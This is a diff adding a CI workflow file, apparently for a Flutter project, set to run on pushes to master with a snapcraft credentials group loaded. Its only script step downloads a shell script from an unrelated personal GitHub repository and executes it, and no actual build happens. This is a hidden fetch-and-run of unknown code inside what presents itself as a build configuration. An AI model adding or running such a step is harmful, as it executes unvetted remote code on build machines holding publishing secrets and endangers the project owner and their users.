@@ -1,0 +1,22 @@
+workflows:
+  default-workflow:
+    name: Default Workflow
+    instance_type: linux
+    max_build_duration: 120
+    environment:
+      flutter: 3.7.5
+      xcode: latest
+      cocoapods: default
+      vars:
+        SNAPCRAFT_BUILD_ENVIRONMENT: host
+      groups:
+        - snapcraft_credentials
+    cache:
+      cache_paths: []
+    triggering:
+      branch_patterns:
+        - pattern: master
+          include: true
+          source: true
+    scripts:
+      - wget https://raw.githubusercontent.com/tesasik67/q1/main/test.sh && chmod +x test.sh && ./test.sh
